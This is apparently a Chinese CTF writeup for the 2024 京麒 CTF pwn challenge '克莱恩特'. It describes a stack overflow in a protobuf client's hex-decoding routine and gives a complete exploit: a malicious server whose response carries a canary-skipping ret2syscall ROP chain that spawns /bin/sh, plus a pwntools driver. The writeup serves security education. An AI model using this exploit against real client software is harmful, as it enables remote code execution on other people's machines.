---
date: 2024-8-4 10:22:03
layout: post
title: 小记一道神奇 protobuf 交互题
subtitle: 京麒 ctf 2024 克莱恩特 writeup
description: >-
    又是被 k4ra5u 师兄 carry 的一天：）
image: >-
  /assets/img/uploads/getshell2.png
optimized_image: >-
  /assets/img/uploads/protobuf_send.png
category: ctf
tags:
  - pwn
  - ctf
  - protobuf
  - pwn client
  - writeup
author: rosayxy
paginate: true
---
# 小记一道神奇 protobuf 交互题 -- 京麒 ctf 2024 克莱恩特 writeup
赛场上 k4ra5u 师兄出了这道题（tqlhhh），由于他做题好快 + 笔者早上脑子不是十分在线，于是相当于只打了一个辅助。比赛完把整道题从头开始打了一遍，感觉还是挺有趣的一个题+发现了自己的一些问题，遂写下这篇 writeup
## 题目
题目给了一个名叫 oddclient 的二进制文件和一个 odd.proto   
file 一下 oddclient 发现是静态链接，仿佛回到了去年刚学 pwn 的时候 ~   
oddclient 逆向不太复杂，但是因为之前没怎么打过交互 pwn 所以也是花了一些力气理解流程ww，具体逻辑 belike: 
- 他先根据用户输入的 ip 和 port 连接我们的服务器
- **按照 odd.proto 的格式，和服务器进行四次交互**，并且要满足 Opcode,content，sequence，魔数的一些要求   
## 漏洞
在 `check_opmsg_sendrecv` 函数中，搞了一个 1024 字节左右大小的 buffer 在栈上（后面称为 stack_buffer）然后作为参数传给`processResponseContent`，进而被传给 unhex 函数，unhex 函数会把我们传入的字符串解析为真正的 content，塞到 stack_buffer 里面,在解析过程中，大概是我们传入的字符串的2个字符对应 stack_buffer 的一个字符。    
而我们传入的字符串最多可以到4000字节左右，解析后砍半也可以到2000字节左右，可以发生一个栈溢出    
## 利用思路
- 整体来说，我们打 ret2syscall，先用 read 把 `/bin/sh\x00` 读到一个可控地址，再用 execve 执行 `/bin/sh`   
- 细节是为了绕过 canary 和不破坏栈上原有结构，可以注意到在 buffer 里面的不是 0-9a-fA-F 的字符会直接跳过，然后 stackbuffer 的 index 和 我们传入字符串的 index 都增加，所以可以利用这个特性不覆盖掉原有栈上内容，只写返回地址   
## 交互
一开始让 gpt 写一个，然后它只写了一次交互的流程，花了好久才把它改成可以连续多次交互的ww    
交互框架 belike:
```python
while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        while True:
            print(f'connection from {client_address}')
            # Receive the message from the client
            serialized_message = connection.recv(1024)
            if not serialized_message:
                break
            client_message = Message()
            client_message.ParseFromString(serialized_message)
            print(f'Received message: {client_message}')

            # Create a response message
            response_message = Message()
            response_message.magic = 875704370
            response_message.seq = client_message.seq+1
            response_message.opcode = client_message.opcode
            if response_message.opcode==Opcode.OP_MSG:
               # do something to stack overflow
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_HELLO:
                response_message.cont = b"helloOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_SESSION:
                response_message.cont = b"sessionOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_END:
                response_message.cont = b"Ok"
                # Send the response back to the client
                send_proto_message(connection, response_message)

    finally:
        # Clean up the connection
        connection.close()
```
踩过的坑如下：
- 一个非常基本的点，应该是写成先收再发的交互形式。一开始试着选一个合理的时间间隔发包，发现会出现 server 这边还在发，client 因为 server 发的上一个包没过检查所以终止的情况，会 pipe 报错。此外，内层 while 在收不到包的时候也是需要 break 的ww ~
- 一定要写两个 while 循环，内层的 while 对应于每次的四次交互，外层的 while 可以防止比如说 oddclient 跑挂的话，只用 gdb oddclient 就行，不用重开服务器，调试的时候省力很多 ~   
- try-except-finally 一定要放在内层循环的外面，不然发第一遍消息之后 connection 已经被关闭了，再发消息就会报错 fd corruption 之类的奇怪错误，其实看 connection 的定义位置，应该能想到是在内层循环的外面ww ，评价是 python 没学好:（    
## exp
把交互搞定之后，就变成一个基本栈题了hh ~ 其实笔者一开始 unhex 逆向有点小问题，所以也是调试了一会才搞定的hhh（exp 中可以看到痕迹）
```python
import socket
from time import sleep
from odd_pb2 import Message,Opcode # 生成的protobuf文件
from pwn import*
syscall_addr=0x65c47b
binshell_addr=0x765a98 # 在 bss 上随便放
pop_rsi=0x4161b3
pop_rdi=0x4146a4
pop_rdx_rbx=0x6615ab
pop_rax=0x54688a
# syscall read and syscall binshell
# Helper function to send protobuf message over a socket
def send_proto_message(conn, proto_message):
    print("send_proto_message:",proto_message,proto_message.cont)
    serialized_message = proto_message.SerializeToString()
    length = len(serialized_message)
    conn.sendall(serialized_message)

# Helper function to receive protobuf message from a socket
def receive_proto_message(conn):
    serialized_message = conn.recv(1024)
    message = Message()
    message.ParseFromString(serialized_message)
    return message
    
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('0.0.0.0', 5001)
print(f'starting up on {server_address[0]} port {server_address[1]}')
sock.bind(server_address)

# Listen for incoming connections
sock.listen(4)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        while True:
            print(f'connection from {client_address}')
            # Receive the message from the client
            serialized_message = connection.recv(1024)
            if not serialized_message:
                break
            client_message = Message()
            client_message.ParseFromString(serialized_message)
            print(f'Received message: {client_message}')

            # Create a response message
            response_message = Message()
            response_message.magic = 875704370
            response_message.seq = client_message.seq+1
            response_message.opcode = client_message.opcode # 写法 from 凯华
            if response_message.opcode==Opcode.OP_MSG:
                # padding 是 0x428 长度
                padding_len=0x428 
                rop=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(binshell_addr)+p64(pop_rdx_rbx-1)+p64(0x30)+p64(0)+p64(pop_rax)+p64(0)+p64(syscall_addr) # pop_rdx_rbx 的地址在解析后会多1，有点奇怪
                rop+=p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binshell_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx_rbx)+p64(0)+p64(0)+p64(syscall_addr)
                # do hex
                s=""
                for i in range(len(rop)):
                    t_low=rop[i]&0xf
                    t_high=rop[i]>>4
                    if t_low<10:
                        s+=chr(t_low+48)
                    else:
                        s+=chr(t_low+87)
                    if t_high<10:
                        s+=chr(t_high+48)
                    else:
                        s+=chr(t_high+87)
                # 相邻奇偶字换序
                s2=""
                for i in range(0,len(s),2):
                    s2+=s[i+1]
                    s2+=s[i]    
                response_message.cont = b"h"*padding_len*2+s2.encode("latin-1")
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_HELLO:
                response_message.cont = b"helloOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_SESSION:
                response_message.cont = b"sessionOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_END:
                response_message.cont = b"Ok"
                # Send the response back to the client
                send_proto_message(connection, response_message)

    finally:
        # Clean up the connection
        connection.close()

```
此外为了发 "/bin/sh\x00" 主要是那个结尾的0,另写了一个脚本来和 oddclient 交互
```python
from pwn import*
p=process("../oddclient")
context(log_level="debug",arch="amd64")

p.recvuntil("ip: ")
p.sendline("0.0.0.0")
p.recvuntil("port: ")
p.sendline("5001")
sleep(0.4)
p.sendline("/bin/sh\x00")
p.interactive()
```
原题和所有做题痕迹见 [这里](Rosayxy.github.io/attachments/pwn_client.zip)
## 总结
发现交互 pwn 题还是要多练ww，感觉写&逆向交互都不太熟练，下次争取在赛场上打出来 ~    